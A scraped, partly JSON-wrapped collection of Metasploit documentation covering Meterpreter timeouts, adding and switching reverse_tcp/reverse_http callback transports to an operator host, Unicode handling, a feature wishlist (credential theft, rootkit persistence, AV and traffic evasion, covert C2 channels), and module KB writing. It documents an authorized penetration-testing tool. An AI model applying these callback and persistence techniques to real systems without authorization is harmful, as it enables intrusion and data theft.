    "content": "Meterpreter supports the querying and updating of each of these timeouts via the console. In order to get the current timeout settings, users can invoke the get_timeouts command, which returns all four of the current timeout settings (one for the global session, and three for the transport-specific settings). An example of which is shown below: . meterpreter &gt; get_timeouts Session Expiry : @ 2015-06-09 19:56:05 Comm Timeout : 100000 seconds Retry Total Time: 50000 seconds Retry Wait Time : 2500 seconds . The Session Expiry value is rendered as an absolute local time so that the user knows when the session is due to expire. In order to update these values, users can invoke the set_timeouts command. Invoking it without parameters shows the help: . meterpreter &gt; set_timeouts Usage: set_timeouts [options] Set the current timeout options. Any or all of these can be set at once. OPTIONS: -c &lt;opt&gt; Comms timeout (seconds) -h Help menu -t &lt;opt&gt; Retry total time (seconds) -w &lt;opt&gt; Retry wait time (seconds) -x &lt;opt&gt; Expiration timeout (seconds) . As the help implies, each of these settings takes a value that indicates the number of seconds. Each of the options of this command are optional, so the user can update only those values that they are interested in updating. When the command is invoked, Meterpreter is updated, and the result shows the updated values once the changes have been made. In the case of the -x parameter, the value that is to be passed in should represent the total number of seconds from “now” until the session should expire. The following example updates the session expiration timeout to be 2 minutes from “now”, and changes the retry wait time to 3 seconds: . meterpreter &gt; set_timeouts -x 120 -t 3 Session Expiry : @ 2015-06-02 22:45:13 Comm Timeout : 100000 seconds Retry Total Time: 3 seconds Retry Wait Time : 2500 seconds .

Listing transports . The simplest of all the sub-commands in the transport set is list. This command shows the full list of currently enabled transport, and an indicator of which one is the “current” transport. The following shows the non-verbose output with just the default transport running: . meterpreter &gt; transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 . The first part of the output is the session expiry time. To learn more about expiry time, see [Meterpreter Timeout Control][]. The above output shows that we have one transport enabled that is using TCP. We can infer that the transport was a reverse_tcp (rather than bind_tcp) due to the fact that there is a host IP address in the transport URL. If it was a bind_tcp, this would be blank. Comms T/O refers to the communications timeout value. Retry Total is the total time to attempt reconnects on this transport, and Retry Wait indicates how often a retry of the current transport should happen. Each of these is documented in depth in the Timeout documentation. The verbose version of this command shows more detail about the transport, but only in cases where extra detail is available (such as reverse_http/s). The following command shows the output of the list sub-command with the verbose flag (-v) after an HTTP transport has been added: . meterpreter &gt; transport list -v Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait User Agent Proxy Host Proxy User Proxy Pass Cert Hash ---- --- --------- ----------- ---------- ---------- ---------- ---------- ---------- --------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 Totes-Legit Browser/1.1 . Adding transports . Adding transports gives Meterpreter the ability to work on different transport mechanisms with the goal of keeping the sessions alive for longer. The command for adding new transports varies slightly depending on the transport that is being added. The following command shows a simple example that adds a reverse_http transport to an existing Meterpreter session. It specifies a custom communications timeout, retry total and retry wait, and also specifies a custom user-agent string to be used for the HTTP requests: . meterpreter &gt; transport add -t reverse_http -l 10.1.10.40 -p 5105 -T 50000 -W 2500 -C 100000 -A \"Totes-Legit Browser/1.1\" [*] Adding new transport ... [+] Successfully added reverse_http transport. This command is what was used to create the transport that was listed in the sample verbose output for the transport list command. Here’s a deeper explanation of the parameters: . | The -t option is what tells Metasploit what type of transport to add. The options are bind_tcp, reverse_tcp, reverse_http and reverse_https. These match those that are used for the construction of the original payloads. Given that we are not dealing with stages, there is no reverse_winhttps because Meterpreter always uses the WinHTTP API behind the scenes anyway. | The -l option specifies what we all know as the LHOST parameter. | The -p option specifies what we all know as the LPORT parameter. | The -T option matches the retry total parameter. The measure of this value is in seconds, and should be a positive integer that is more than -W. | The -W option matches the retry wait parameter. The measure of this value is in seconds and should be a positive integer that is less than -T. | The -C option matches the communication timeout. The measure of this value is in seconds and should be a positive integer. | The -A specifies a custom user agent that is used for HTTP requests. | . It is also possible to specify the following: . | The -u option allows the addition of a local URI (LURI) value that is prepended to the UUID URI that is used for all requests. This URI value helps segregate listeners and payloads based on a URI. | The -H option specifies a proxy host/IP. This parameter is optional. | The -B option specifies a proxy type, and needs to be set to http or socks. If not specified alongside the -H parameter, the default type is http. | The -P option specifies the port that the proxy is listening on. This should be set when -H is set. | The -U option specifies the username to use to authenticate with the proxy. This parameter is optional. | The -N option specifies the password to use to authenticate with the proxy. This parameter is optional. | The -X option specifies the overall Meterpreter session timeout value. While this value is not transport-specific, the option is provided here so that it can be set alongside the other transport-specific timeout values for ease of use. | Finally the -c parameter can be used to indicate the expected SSL certificate. This parameter expects a file path to an SSL certificate in PEM format. The SHA1 hash of the certificate is extracted from the file, and this is used during the request validation process. If this file doesn’t exist or doesn’t contain a valid certificate, then the request should fail. | . The following shows another example which adds another reverse_tcp transport to the transport list: . meterpreter &gt; transport add -t reverse_tcp -l 10.1.10.40 -p 5005 [*] Adding new transport ... [+] Successfully added reverse_tcp transport. meterpreter &gt; transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 . Note that these examples only add new transports, they do not change the current transport mechanism. When a transport is added to the list of transports, they are always added at the end of the list, and not the start. Change transports . There are three different ways to change transports. One thing they do have in common is that transport switching assumes that you have listeners set up to receive the connections. If no listener or handler is present, then the resiliency features in Meterpreter will cause it to constantly attempt to establish connectivity on that transport using the transport timeout values that were configured. If the transport ultimately fails, then Meterpreter will cycle to the next transport on the list and try again. This will continue until a transport connection is successful, or the session timeout expires. More information on this can be found in the session resiliency documentation (link coming soon). The three different ways to change transports are: . | transport next - This command will cause Meterpreter to shut down the current transport, and attempt to reconnect to Metasploit using the next transport in the list of transports. | transport prev - This command is the same as transport next, except that it will move to the previous transport on the list, and not the next one. | transport change ... - This command is equivalent to running transport add, and requires all the parameters that transport add requires (resulting in a new transport at the end of the list), and then transport prev (which is the same as going from the start of the list to the end). The net effect is the same as creating a new transport and immediately switching to it. | . As an example, here is the current transport setup: . meterpreter &gt; transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 .

This output shows that we moved from the original reverse_tcp to the reverse_http transport, and this is now the current transport.

Remove transports . It is also possible to remove transports from the underlying transport list. This is valuable in cases where you want Meterpreter to always callback on stageless listeners (allowing you to avoid the unnecessary upload of the second stage), or when you have a listener located at an IP address that may have been blacklisted by your target as a result of your post-exploitation shenanigans. The command is similar to add in that it takes a subset of the parameters, and then adds a new one on top of it: . | -t - The transport type. | -l - The LHOST value (unless it’s bind_tcp). | -p - The LPORT value. | -u - This value is only required for reverse_http/s transports and needs to contain the URI of the transport in question. This is important because there might be multiple listeners on the same IP and port, so the URI is what differentiates each of the sessions. | .

Resilient transports . Previously, Meterpreter only had built-in resiliency in the HTTP/S payloads and this was due to the nature of HTTP/S as a stateless protocol. Meterpreter now has resiliency features baked into TCP transports as well, both reverse and bind. If communication fails on a given transport, Meterpreter will roll over to the next one automatically. The following shows Metasploit being closed and leaving the existing TCP session running behind the scenes: . meterpreter &gt; transport list Session Expiry : @ 2015-06-09 19:56:05 Curr URL Comms T/O Retry Total Retry Wait ---- --- --------- ----------- ---------- * tcp://10.1.10.40:6000 300 3600 10 http://10.1.10.40:5105/jpdUntK69qiVKZQrwETonAkuobdXaVJovSXlqkvd7s5WB58Xbc3fNoZ5Cld4kAfVJgbVFsgvSpH_N/ 100000 50000 2500 tcp://10.1.10.40:5005 300 3600 10 meterpreter &gt; background [*] Backgrounding session 5... msf exploit(handler) &gt; exit -y .

From here, Meterpreter continues to try to re-establish connectivity with Metasploit on this transport a per the transport timeout settings.

The session is back up and running as if nothing had gone wrong. In the case where Meterpreter is configured with only a single transport mechanism, this process still takes place. Meterpreter’s transport list implementation is a cyclic linked-list, and once the end of the list has been reached, it simply starts from the beginning again. This means that if there’s a list of one transport then Meterpreter will continually attempt to use that one transport until the session expires. This works for both TCP and HTTP/S.

    "doc": "Unicode Support",
    "title": "Unicode Support",
    "content": "Until recently (April 2015), Meterpreter always sent string data in whatever the system encoding happened to be. With the TLV protocol, the TLV_TYPE_STRING was treated roughly as a plain C byte array, with no real expectations as to how the data should be decoded on the Meterpreter or Metasploit framework sides. As a result, type confusion occurred between different locales on remote machines and the local console. To avoid corrupting the terminal due to mistaken character encoding interpretations, Metasploit framework implements Unicode filter that converts any possibly unprintable characters into hex strings. While this allows a sufficiently-advanced human to eyeball a string for meaning, it makes dealing with Unicode strings awkward. To solve the problem, TLV_TYPE_STRING has been retroactively declared to mean UTF-8 encoding only. All Meterpreter implementations should send UTF-8 strings and expect them in requests. On Windows systems, this means that Meterpreter needs to convert to and from Windows’ UTF-16LE implementation. So far, the Filesystem operations on all Meterpreters have been converted to expect a and send UTF-8 strings. Only the PHP meterpreter on Windows lacks Unicode support, due to limitations in PHP itself. All new TLVs should send and receive UTF-8. There is still functionality, that needs conversion beyond the Filesystem APIs, and these can be loosely discovered with a command like grep -R A\\( * to find all ASCII variants of functions called by meterpreter. In the Windows C meterpreter, there are a couple of helper functions to simplify the conversion work: . wchar_t *utf8_to_wchar(const char *in); char *wchar_to_utf8(const wchar_t *in); . These functions both allocate a new string as their return value, so the strings should be freed after use by the caller. Here is an example of a function expanding a path and performing the conversion to and from UTF-8: . char * fs_expand_path(const char *regular) { wchar_t expanded_path[FS_MAX_PATH]; wchar_t *regular_w; regular_w = utf8_to_wchar(regular); if (regular_w == NULL) { return NULL; } if (ExpandEnvironmentStringsW(regular_w, expanded_path, FS_MAX_PATH) == 0) { free(regular_w); return NULL; } free(regular_w); return wchar_to_utf8(expanded_path); } . Unicode support in Metasploit framework today is enabled by default on Linux/Unix systems, since most modern terminal emulators have no trouble displaying the characters. However, on Windows, most native terminal emulators ironically have trouble working with more than one language at once, due to historical code page support. So, for Windows, Unicode characters are still filtered by default. Setting EnableUnicodeEncoding to false will allow the native characters to be emitted by the Metasploit console. ",

    "content": "This document is our live wishlist of features and changes for the Metasploit Meterpreter payloads. The majority of this list came from a survey sent out to the community in early 2015. If you plan to work on one of these features, please add a note to the item, and reference any open tickets or pull requests that are relevant. This document only contains survey suggestions that were specific to Meterpreter. Duplicate and similar items have been combined. Items currently in development have been marked [IN PROGRESS] . Items landed to master have been marked [DONE] . Related open tickets (slightly broader than Meterpreter): . | [DONE] Make User-Agent easier to control across modules and more consistent | [IN PROGRESS] Comprehensively refactor Windows reverse_http stagers | [DONE] Python reverse HTTPS stager | [DONE] Port windows reverse_tcp &amp; bind_tcp to Metasm. Was later found to be implemented in https://github.com/rapid7/metasploit-framework/pull/5214. | . Meterpreter Platform Support . | Mac Meterpreter | iOS Meterpreter | PHP Meterpreter should have equivalent functionality to Win32 | Python Meterpreter should have equivalent functionality to Win32 | POSIX Meterpreter should have equivalent functionality to Win32 (extract it from Win32 codebase) | Powershell Meterpreter | Some users indicated that the Python/PHP Meterpreters were important because the POSIX/Linux Meterpreter was not working for them | . Mimikatz Integration . | In-memory pass-the-hash (basically this runs a process as “netonly” I believe, then injects real credential hashes supplied by the user in order to perform network based auth to things with only a hash) | Exporting of certificates, keys, and tickets in base64 format (already supported) then down to real files on disk for the attacker info | Add on-target minidump extraction | Add sekurla::searchpasswords | Expand Mimikatz and contribute back to it | Integration of Mimikatz with the credential database | Latest version of Mimikatz to be used as the plugin | It would be great to have a method to generate a golden ticket for a specific period of time (month, 6-months, year) rather than only 10 years. | . Meterpreter Pivoting . | VPN Pivoting for Framework (WinPcap still better than nothing) | Reverse pivoting from the target machine back to the attacker (TCP/UDP) . For many years I’ve asked for this feature. Basically Meterpreter needs to be able to say, listen on port 8080 on victim 1 and it go through the Meterpreter session to port whatever (9060) on the attacker’s machine or a designated alternate IP. then, whenever someone hits that port it’s auto forwarded through the session. This could help out a lot for SMB capture, Post exploitation phishing, and other things like setting a user’s proxy to use your forwarded port instead of the corporate proxy. | Improved pivoting speed and latency | Pivoting that is reliable and works well with different transports. In particular, I want the ability to pivot one session through another even if the first session is reverse_tcp or reverse_https, regardless of the second sessions transport. This will be difficult without installing drivers, but I would like several useful, working transports that I know I can pivot reliably with. | Carry portforwards and other channels along with a migrate. | . Privilege Escalation . | Allow privilege escalation modules to increase the privileges of the current session instead of firing off a new session. | Automated privesc for all platforms - not just Windows. | Implement a “privup” command that is similar to getsystem which automatically tries to get higher privs using local exploits. Allow the user to specify a “force” flag to automatically try “dangerous” privilege escalations (kernel mode, etc) | Make the “local” modules more seamlessly accessible inside Meterpreter without requiring sending your session to background and running a local module separately against it.Would be nice to have a built-in Meterpreter command called “local” with tab complete that would list the local modules relevant to that platform/arch - then running one of the local modules auto selects your current session, spawns a new metepreter session and transfers you over to that session automatically if successful with a clear message/indication that your now in a new elevated Meterpreter session. | . Remote File Access . | [DONE] Console/Meterpreter: Support for uploading, downloading, deleting, renaming, and listing files using UTF-8 input and showing UTF-8 output, converting this in the Meterpreter payload as necessary to support accessing unicode paths on the target. | [DONE] Console: The ls command should support wildcards in the directory listing, ex: ls *.csv | [DONE] Console: The ls command should support sorting files by date, name, or size | [DONE] Console: The ls command should support listing MSDOS 8.3 (short) names if available on Windows | [DONE] Console: The download command should support filtering files based on a wildcard match (recursively, too) | [DONE] Console: The download command should mirroring an entire remote file system to a local directory (names, paths, and timestamps) | . Meterpreter Features . | Direct Powershell integration on Windows (load &amp; run .NET runtimes from inside Meterpreter) | Remote (target-side) scripting | Builtin userland persistence | Builtin rootkit/bootkit payload persistence | Create payloads that only “install” on specific computers (based on hardware, windows domain, etc) | Acquire a physical RAM image without touching the disk. This currently requires uploading winpmem[64].sys to windows\\system32 and invoking it through post/windows/manage/driver_loader. As loaded winpmem.sys exposes the RAM as disk device I can then suck it through post/windows/manage/nbd_server. Please make this possible without dropping winpmem.sys to system32 folder if possible | Manage multiple Meterpreter processes as one session as described in #4715. Many times there have been situations where a keyscan, or sniffer was going and something else occurred that required migration or cancelling to perform an action. “Installing” jobs in processes less likely to die would allow a pentester to still move around as needed but also be able to have persistent tasks going. A pipe dream of this feature would be to install a “rev2system” jobs whereby I could migrate to a low priv status for accessing Cryptolib encrypted storage but also get back to SYSTEM when I’m done without needing to pop a shell again. Another pipe dream here would be to also have jobs that if the user logged out, then back in the next day and I had a shell come back then, I could re-attach to my running jobs and get their results . | PrependTokenSteal / PrependEnvironmentSteal: Basically with proxies and other perimeter defenses being SYSTEM doesn’t work well. This would be an addition to a payload that would work to execute as SYSTEM but would then locate a logged in user and steal their environment to call back to the handler. Very useful when pivoting around with PSEXEC | Binary installed death dates: A way putting a date in a binary where after that date the binary no longer functions would be useful and possibly even perform self-deletion. Time zones would be a tricky matter, but is something handled by many programmers already (probably just not in shellcode) | Allow Meterpreter sessions to resolve L3 addresses (#4793) | Track whether or not the current session has admin credentials (#4633)d | Support Metasploit-side zlib compression of sessions | Being able to use Meterpreter instances to easily forward commands &amp; exfil | Automatic cleanup and removal of session and any recorded persistence after predetermined amount of time (server-side) | Change desktop/phone background | Remote mouse control | Play sound on the remote system | Read words out loud via text to speech on the remote system | Volume control | RSS feed from reverse_http(s) mult-handler that I can connect a RSS reader to (or something like IFTTT) and get notices when new sessions are created | MessageBox popups | Call the system “open” command easily (ShellExecute on windows, launch intent on Android) | Gather credentials from Google Chrome | LNK (binary) modification: Editing a LNK file’s ICON location (for SMB capturing), “Starting Directory” (for DLL injection) or target binary would make some post exploitation tasks easier | “Pinned” app modification: Knowing which apps are pinned, and what they link to (be it taskbar or start menu) would be useful intelligence, but also being able to modify the target of these links would be better and a very easy user-land persistence. (Run this &amp;&amp; the real thing you want) | Remote Registry automation: Remotely editing or reading the registry of a remote system works currently (sometimes) but it has no smarts about if the Remote Registry service is on or not. It would be nice to automate the starting and stopping of the remote registry service as well as possibly warning the user if they are attempting to do this as SYSTEM (probably going to fail). The use case for this is installing persistence on lots of systems quickly as well as reading user lists, MRUs and other intelligence important keys. (like finding a system with the puTTY keys) | “ps” and “kill” for remote systems: This would remove the need to drop to a shell and attempt to remember how to format “taskkill” and “tasklist”’s argument list. Tasklist also automatically removes the IPC$ connection after it’s done so results in some annoying disconnected share viewing | Scheduled Tasks / AT: Many of the ways to pivot or stay persistent use AT or Scheduled Tasks, to do so. This functionality to do tasks both locally and on remote hosts would greatly decrease the number of times a pentester would need to drop to cmd.exe | [DONE] Execute with login credentials: When a user is no longer online it is overkill to PSEXEC (which would just net a SYSTEM shell anyways with MSF) and “RunAs” isn’t supported since it requires a password at a prompt, so adding a simple CreateProcesWithLogon feature would help with reviving dead tokens #4649 | ListDrives: Most of the time shares and other drives rather than just C:\\ are where important files are stored. This feature would list local storage (plus USB) and network storage (SMB connected drives with where they are connected from and as what user) to start, but this feature would need to grow to support “Cloud” drives as well, like Dropbox, Box, Google Drive, and SkyDrive. | Enumerables support in Railgun: Windows is full of “Enumerables” like EnumWindows that would be nice to have the ability to create code for. That example is bad since ExtAPI has EnumWindows now but the argument doesn’t go away for railgun | DACL / Permissions enumeration: This is just needed in general for privilege escalation enumeration, share permissions, and reporting (“Why did you have access to this share, it was only supposed to be for X”) | Gina/SSP support: This would probably need to be an injected “job” but the basic premise is an in-memory load of a SSP or inject into Gina so when a new login happens against the system a set of clear text credentials are captured. 2 extremely use cases would be on a terminal server, or a server that no one is logged into at the time of infection due to time zone or operating hour differences | Websnapshot: Currently there isn’t a way to weed out web applications once in a network. This feature would, using IE, or another method be able to generate a screenshot of what a page looks like in a browser (given a PROTOCOL/URL/PORT). Biggest requirement is auto-accepting any self signed SSL certs and showing when authentication is required. | On-target resource cloning: Allowing a pentester to drop a binary and clone the ICON (in particular) of a binary would add to the stealthiness of an operation and add attack opportunities that weren’t previously thought plausible | Scatterbomb: Persistence is difficult, and making sure your session doesn’t die because you chose the wrong process to migrate into or the user exited that process because the PDF looked hung. This would work by attempting OpenProcess on every process or a select list of processes and inject Meterpreter threads into them. But it would rely on the Mutex feature so that only one would be calling back at a time. Basically allowing for a resilient semi-persistent Meterpreter session that would save you from yourself when you accidentally type exit on the Meterpreter&gt; prompt instead of your other terminal | Mutex checking binary exports: This follows up with the scatterbomb but essentially when installing persistence as a pentester I only install one because installing more than one would raise the noise level of a compromised host. If the binary/callback would check a mutex before doing anything and looping based on a timeout that even better. | OLE / Office Controls: This is basically an open ended feature request asking for support of for Office, mostly Outlook (like read newest emails, search email, etc). | Configurable character set conversation for Shell sessions and channels. When spawning a windows shell from meterpreter, on a host that uses a German version of windows, all the special characters (e.g. öäü) are broken, i.e. they are either not rendered at all, or replaced with that default “character not found” unicode character. Forcing the terminal emulator to use cp850 made it work for now. | . Metepreter Stager Support . | [DONE] Network error tolerant versions of existing stagers | [DONE] Tagged stagers that send the payload type, arch, platform during the staging process to enable shared listeners | [DONE] Stagers that contain an embedded unique ID that can be used to identify which payload triggered what session | [DONE] Stagers that are “stageless” for Meterpreter (include the entire main Meterpreter payload, plus any required extensions). In situations of high network latency or extreme network detection a non-staged exe is the only way to go. Ulta-met is a project that does this but isn’t as stable or easy to work with as if it were just built into the binary creation options. | [DONE] Stagers that are “stageless” for Meterpreter and include all potential functionality (all extensions) | . Meterpreter Transport Flexibility . | [DONE] Support for changing the transport (host, port, URL) of a live session to a new endpoint or protocol | [DONE] Support for multiple transports for the initial session, using the first transport that works | [DONE] Support for multiple endpoints across multiple transports for the initial session | [DONE] Support for automatic switching between multiple transports while the session is running | [DONE] Support for user-configured callback frequency and endpoint rotation | Support for Tor tunneling to .onion and internet-facing listeners | Support for time-based callback, such as limiting callbacks to certain times of the day. | Support for P2P style callbacks. Gossip protocol to find other Meterpreters on the network and use them as exfiltration point. This callback would reduce the amount of endpoints that would call “out” to a handler to 1. Whoever the “master” was. All comms would automatically (because, math) find and delegate this master and finally send through the master all of their comms. This could happen over a named pipe, or a forwarded port or something. (DHT?) | Support for DNS A/TXT transports | Support for UDP transports | Support for ICMP transports | Support for TLS encrypted bind listeners | Support for HTTP application listener (ie CGI mode Meterpreter session, tomcat servlets, etc) | Support for third-party communication transports (Github, Twitter, pastebin, etc) | Support for XMPP transports. Many organizations use IM and chat clients internally and support them going outbound. reverse_tcp being stopped for the most part these days and more and more catching reverse_http(s) due to proxies, this might become the next outlet. Possibly using server that are already established in the industry ;-) but mainly supporting XYZ jabber server as a pass through. This would probably be a very big piece of shellcode as I don’t believe any Windows OSs support XMPP out of the box. | Support for IE callback: One method deployed by some more infamous malware is to only communicate when IE is running and surfing and only by hooking IE to send comms. This callback would operate very much the same and would support any kind of proxy by default as IE does. | Support for Outlook callback: This callback would use email back and forth either directly to a MSF run SMTP server or through other services, but the C2 channel would be locally (not on the exchange filter system) auto-filtered to a non-visible folder (using PidTagAttributeHidden). This type of comms would greatly increase the lag time supported in Metepreter simply due to the inherent lag in email. | . Meterpreter HTTP Transport Options . | [DONE] Create a whitelist of allowed URLs on the handler, have these persistent between metasploit runs | [DONE] Indicate whether a given handler should silently accept, accept and report, or drop connections using unregistered URLs | [DONE] Whitelisted URLs should be referencing using an alias, stored persistently with the URL | [DONE] Session listing output should indicate what URL and URL alias a particular session is associated with | [DONE] URLs can be anywhere from 30 to 128 bytes long | . Meterpreter Proxy Support . | [DONE] Use Windows Credentials with NTLM Authentication to connect via System Proxy back to attacker | If Meterpreter executes as system - option to find a user, and use that users proxy settings for comms (temporarily or cleanup on exit) - maybe something like RunAsCurrentUser | [DONE] Better proxy support and the ability to sleep. Still more to done on burstable updates | . Communication Protection . | Authenticated callbacks: This is pretty straight forward, when a pentester no longer controls the IP they were attacking from and failed to clean up every binary and phishing email there is a chance of compromise by proxy. The problem was somewhat solved with SessionExpirationTimeout and SessionCommunicationTimeout but both of them are loaded in the stage, not hard coded into any binary built, so it’s very easy to get into this situation. Authenticated callbacks would allow a pentester to add a small layer of protections if this event were to happen and a callback from a client was sent to an IP no longer in the pentester’s control | Embedded TLS cert or hash of cert to verify Meterpreter instance on the Metasploit side | [DONE] Embedded TLS cert or hash of cert to verify Metasploit instance on the Meterpreter side | Embedded password to verify Meterpreter instance on the Metasploit side (challenge-response) | Embedded password to verify Metasploit instance on the Meterpreter side (challenge-response) | [DONE] Enable TLS verification to verify Metasploit instance on the Meterpreter side | [DONE] Allow open, relaxed, strict modes of payload authentication (everything, everything but flag unauthorized, drop non-authorized) | . Communications Evasion . | Emulation of common web application traffic when using HTTP-based transports | Change web application traffic emulation fingerprints on the fly when using HTTP-based transports | [DONE] Sleeping for a specified period of time before reconnecting to Metasploit | [DONE] Automatic shutdown/cleanup after a specified amount of time has passed | Traffic shaping or malleable communications, especially for HTTP(S), can be very useful for blending in, or even for adversary simulation. See Maligno (OSS - http://www.encripto.no/tools/) | Malleable network signatures in general | Malleable file artefacts - Make Meterpreter look like PlugX / Poison Ivy / etc. | Stealthier network comms (C2 DLL inject into web browser) | Better support to automatically identify applications that use a corporate proxy that allows outside connections and then leverage this application’s features | Emulate various real world malware | Being able to use Meterpreter instances to easily forward commands &amp; exfil | Supporting a set URI path for reverse_http(s), so you can use other webservers as a reverse proxy. | . Session Handlers . | [DONE] Generate a unique ID for each session (target-side) | [DONE] Generate a unique ID for each generated payload Backdooring/Persisting on more than 10 machines over months it gets very difficult to know when a host hasn’t called back in a while or when a new host arrives. This would need not to be based on gateway, local IP, or any other transient information. This can be processed at any step as long as when STDAPI is loaded I can quickly identify if it’s a system that I’ve known about, and how long it’s been since I’ve seen it. | Shared listeners that can stage multiple payload architectures and platforms (using tags). Depends on new stagers and a new listener and unique IDs. [IN PROGRESS] | [DONE] Track the last time a given session checked in | Track user defined state data in the db, such as specific user / member of group logged in, specific shares open, certain tuple of IP:port in network connections (1.2.3.4 over 22 where 1.2.3.4 is an IP of interest) | Reconnecting payloads will have different IPs, take this into account for session methods (peerinfo/tunnelinfo, etc) | . Session Reliability . | [DONE] Metasploit payloads should always restore connections if there is a network error unless the user explicitly kills the session | Improve reliability, encryption, authentication. Better integration for custom payloads. | Spawn a new session before running a module that could crash the current session (mostly privilege escalation, but some buggy post modules too [railgun]) | Meterpreter should work robustly in a VM, on a cloud server, or through corp proxies | . Android Meterpreter Features . | Android gather modules for auth tokens &amp; sqlite databases (call logs, contacts, email, etc) | [DONE] Android lock screen removal | Crack the lock screen hash to reveal the password, pin code or gesture | Remote screen control | Add record_mic_stream (trigger based on event, like phone call) | [DONE] Grab photos from front and rear cameras | Android desktop background, sound play, vibrate, screenshot | [DONE] Quickly grab GPS coordinates | Windows post module to install Meterpreter on any attached android devices | Better pivoting (e.g bridging between WiFi and 4g) | More root exploits | Dump browsing history and cookies | Comprehensive test suite (including rspec) | ARM/POSIX Meterpreter | [DONE] Support for native payloads in the addJavascriptInterface exploit | . Payload Generation . | Msfvenom should support injecting into existing APKs for Android Meterpreter deployment. Otherwise, it’s just an app the target installs for 10 seconds and removes after confirming it has no user interface, barely allowing the Meterpreter session to be created. [IN PROGRESS] | Msfvenom really needs to spit out some C# payloads. You can pretty easily modify some of the powershell ones to be C#, but there really ought to be a built in C# payload. | [DONE] Generated payloads should default to exiting the process when the shellcode completes | [DONE] Payload generation should allow named UUIDs to be injected into payloads | . Unit testing for payloads . | Metasploit payload classes should have specs, new specs should be created when any class is changed if there isn’t an existing spec. | Metasploit payload tests that can run in Github Actions, should be automatically tested end-to-end | Metasploit payload tests that can’t run in GitHub Actions should be run by Jenkins and target a virtual machine (local or cloud-hosted). | Meterpreter payloads should test every advertised console command. | Meterpreter payloads should test a subset of the full APIs available. | . Meterpreter Specifications . | These define compatibility, quality, and order of preference for Meterpreter payload modules, including stages and stages. | Payload Flags (for matching with exploits/generators/handlers): . | Supports SSL | Supports ZLIB | Staged / Unstaged | . | Quality Rank (for prioritizing bugs/feature work): . | Leverage using Rank system | Windows: Excellent | Python: Great | Java: Good | PHP: Normal | POSIX: Normal | . | Capabilities (queried post-stage to determine features): . | Filesystem | Registry | Pivoting (sockets) | Pivoting vpn) | Process listing, kill, execute | Process memory read, write, injection | Migration | . | .

The help page includes: . | The PR history related to a particular module, if you have a GitHub access token set up. | The basic usage instructions for a module. | The advanced usage instructions for a module, if it’s available. | . How to use it . After you load a module, you can type info -d to generate a help page that provides basic usage information and displays the PR history for the module. msf&gt; use auxiliary/scanner/smb/smb_login msf (smb_login)&gt; info -d . Additionally, if it’s available, the help page will also include a KB that contains advanced usage information, such as vulnerable target details, caveats, and sample usage. The content in the KB is contained in a markdown file in the metasploit-framework/documentation/modules directory. Its purpose is to provide supplemental information that is outside of the scope of general documentation. Add an access token to see PR history . In order for you to be able to view the PR history for a module, you’ll need add your GitHub access token to the environment variable GITHUB_OAUTH_TOKEN=\"&lt;your token here&gt;\" in .bash_profile. To generate a GitHub access token, check out this page. The token will need to have a scope for repos. How you can write KBs . Generally, the person who creates the module will write the initial KB for it, but anyone can write or contribute to it. Before you write a KB, you should take a look at the sample template, module_doc_template.md, or take a look at any of the KBs that are already available. To write a KB, you’ll need to: . | Create an markdown (.md) file. | Write the content. | Save the file and name it after the module name. For example, the filename for ms08_067_netapi.rb is called ms08_067_netapi.md. | Place it in the metasploit-framework/documentation/modules directory as directed below. | . Where to put the KB files . If you go to metasploit-framework/documentation/modules, you’ll see that there are documentation directories for each module type: auxiliary, exploit, payload, and post. To figure out where you need to put the file, you’ll need to look at the module name. | Start msfconsole. | Type use &lt;module name&gt;. | Type info. | When the module name appears, look at the Module field. You’ll see a file path for the module. That’s the path where the KB needs to be added. | . For example: . msf&gt; use auxiliary/scanner/smb/smb_login msf (smb_login)&gt; info Name: SMB Login Check Scanner Module: auxiliary/scanner/smb/smb_login .... If you were creating a KB for the smb login scanner, you’d add it to metasploit-framework/documentation/modules/auxiliary/scanner/smb. Sections you should include in the KB . These are just suggestions, but it’d be nice if the KB had these sections: . | Vulnerable Applications - Tells users what targets (version numbers) are vulnerable to the module and provides instructions on how to access vulnerable targets for testing. If possible provide a download link and any setup instructions to configure the software appropriately. | Verification Steps - Tells users how to use the module and what the expected results are from running the module. | Options - Provides descriptions of all the options that can be run with the module. Additionally, clearly identify the options that are required. | Scenarios - Provides sample usage and describes caveats that the user may need to be aware of when running the module. Include the version number and OS so that this setup can be replicated at a later date. | . ",

Auxiliary modules do not exploit a target, but can perform useful tasks such as: . | Administration - Modify, operate, or manipulate something on target machine | Analyzing - Tools that perform analysis, mostly password cracking | Gathering - Gather, collect, or enumerate data from a single target | Denial of Service - Crash or slow a target machine or service | Scanning - Scan targets for known vulnerabilities | Server Support - Run Servers for common protocols such as SMB, FTP, etc | . Encoder modules (49) . Encoders take the raw bytes of a payload and run some sort of encoding algorithm, like bitwise XOR. These modules are useful for encoding bad characters such as null bytes. Evasion modules (9) . Evasion modules give Framework users the ability to generate evasive payloads that aim to evade AntiVirus, such as Windows Defender, without having to install external tools. Exploit modules (2607) . Exploit modules are used to leverage vulnerabilities in a manner that allows the framework to execute arbitrary code. The arbitrary code that is executed is referred to as the payload. Nop modules (14) . Nop modules, short for ‘No Operation’, generate a sequence of ‘No Operation’ instructions that perform no side-effects. NOPs are often used in conjunction with stack buffer overflows. Payloads modules (1707) . In the context of Metasploit exploit modules, payload modules encapsulate the arbitrary code (shellcode) that is executed as the result of an exploit succeeding. 